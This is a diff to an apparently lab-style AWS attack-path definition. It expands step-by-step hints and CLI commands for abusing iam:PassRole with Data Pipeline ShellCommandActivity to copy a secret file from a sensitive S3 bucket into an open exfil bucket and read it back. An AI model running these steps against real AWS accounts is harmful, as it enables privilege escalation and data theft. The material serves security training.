@@ -60,15 +60,17 @@ attackMap:
         passes the pipeline role to it, and activates the pipeline. An EC2 instance
         is launched running as the pipeline role.
       hints:
-        - "You can pass roles to AWS services to run compute workloads on your behalf."
-        - "Look for services that accept IAM roles and can execute arbitrary commands."
-        - "AWS Data Pipeline can run ShellCommandActivity on EC2 instances using a passed role."
+        - "You have iam:PassRole on a specific role and permissions to create and activate Data Pipelines. What can you do with those together?"
+        - "AWS Data Pipeline can run arbitrary shell commands on EC2 instances via ShellCommandActivity -- and the instance inherits the IAM role you pass to the pipeline."
+        - "Use datapipeline:DescribePipelines and datapipeline:GetPipelineDefinition to inspect what pipelines already exist in the account."
+        - "The pipeline definition JSON needs three parts: a Default object (with role and resourceRole set to your passed role ARN), a ShellCommandActivity, and an Ec2Resource."
+        - "After creating the pipeline with create-pipeline, upload the definition with put-pipeline-definition, then trigger execution with activate-pipeline."
         - "Browse to https://pathfinding.cloud/paths/datapipeline-001 for technique details."
       commands:
         - description: "Create the Data Pipeline"
-          command: "aws datapipeline create-pipeline --name exfil-pipeline --unique-id exfil-pipeline-001"
+          command: "aws datapipeline create-pipeline --name exfil-pipeline --unique-id exfil-pipeline-001 --query 'pipelineId' --output text"
         - description: "Define the pipeline with a shell command activity"
-          command: "aws datapipeline put-pipeline-definition --pipeline-id <pipeline-id> --pipeline-objects file://pipeline-definition.json"
+          command: "aws datapipeline put-pipeline-definition --pipeline-id <pipeline-id> --pipeline-definition file://pipeline-definition.json"
         - description: "Activate the pipeline"
           command: "aws datapipeline activate-pipeline --pipeline-id <pipeline-id>"
 
@@ -78,8 +80,13 @@ attackMap:
       description: >
         The EC2 instance launched by Data Pipeline, operating as the pipeline role,
         reads data from the sensitive S3 bucket.
+      hints:
+        - "The pipeline role's IAM policy grants s3:GetObject on the sensitive bucket -- the EC2 instance the pipeline launches inherits this role and can read from it."
+        - "Use s3:ListBucket on the sensitive bucket (if available) to discover what objects are stored there before designing your ShellCommandActivity command."
+        - "The shell command in your ShellCommandActivity runs on the EC2 instance as the pipeline role, so any AWS CLI command the role is permitted to run will succeed."
+        - "Structure your shell command to copy the sensitive file to a location you control -- the exfil bucket is a candidate, but check its resource policy first."
       commands:
-        - description: "Copy sensitive data to exfil bucket (executed inside pipeline)"
+        - description: "Copy sensitive data to exfil bucket (executed inside pipeline via ShellCommandActivity)"
           command: "aws s3 cp s3://pl-sensitive-data-datapipeline-001-ACCOUNT-SUFFIX/secret-data.txt s3://pl-exfil-bucket-datapipeline-001-ACCOUNT-SUFFIX/exfiltrated.txt"
 
     - from: pipeline-role
@@ -90,8 +97,10 @@ attackMap:
         role has no IAM s3:PutObject permission, the bucket's resource policy grants
         PutObject to Principal "*", bypassing the IAM restriction.
       hints:
-        - "This role only has read permissions via IAM, yet data can still be written to the exfil bucket."
-        - "Check the S3 bucket resource policies — they can grant access independently of IAM."
+        - "The pipeline role has no s3:PutObject in its IAM policy -- yet a write to the exfil bucket may still succeed. Why?"
+        - "S3 bucket resource policies are evaluated independently of IAM policies. A bucket policy allowing Principal '*' grants access to every authenticated AWS principal, regardless of their IAM restrictions."
+        - "Check the exfil bucket's resource policy with s3api:GetBucketPolicy to confirm whether an unconditional PutObject allow exists."
+        - "If the bucket policy grants s3:PutObject to Principal '*' without conditions, any principal in any account can write to it -- including the EC2 instance running as your pipeline role."
       commands: []
 
     - from: starting-principal
@@ -100,6 +109,10 @@ attackMap:
       description: >
         The starting user retrieves the exfiltrated data from the exfil bucket,
         completing the data exfiltration attack.
+      hints:
+        - "Your starting user has s3:GetObject on the exfil bucket -- once the pipeline has written the file, you can read it directly."
+        - "Use s3:ListBucket (if available) to confirm the exfiltrated file landed in the bucket before attempting to read it."
+        - "Wait 60-90 seconds after activating the pipeline for the EC2 instance to launch and execute the shell command before checking for the output file."
       commands:
         - description: "Read the exfiltrated data"
           command: "aws s3 cp s3://pl-exfil-bucket-datapipeline-001-ACCOUNT-SUFFIX/exfiltrated.txt -"
